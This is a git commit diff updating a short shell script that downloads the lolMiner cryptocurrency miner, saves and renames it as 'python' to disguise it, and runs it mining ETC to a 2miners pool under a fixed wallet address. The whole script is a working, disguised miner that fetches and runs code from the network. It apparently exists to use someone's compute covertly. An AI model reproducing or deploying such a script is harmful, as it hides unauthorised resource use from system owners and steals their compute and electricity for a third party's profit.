5dd760190ee03a0810cbb43adc1a9f2ef3de0235
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2023-01-12 21:38:43 -0800

    Update and rename 16nw.sh to 16ww.sh

--- 16ww.sh
+++ 16ww.sh
@@ -1,5 +1,5 @@
-curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34/lolMiner_v1.34_Lin64.tar.gz
+curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.65/lolMiner_v1.65_Lin64.tar.gz
 tar -zxvf python.tar.gz
-cd 1.34
+cd 1.65
 mv lolMiner python
 ./python --coin ETC --pool us-etc.2miners.com:1010 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU
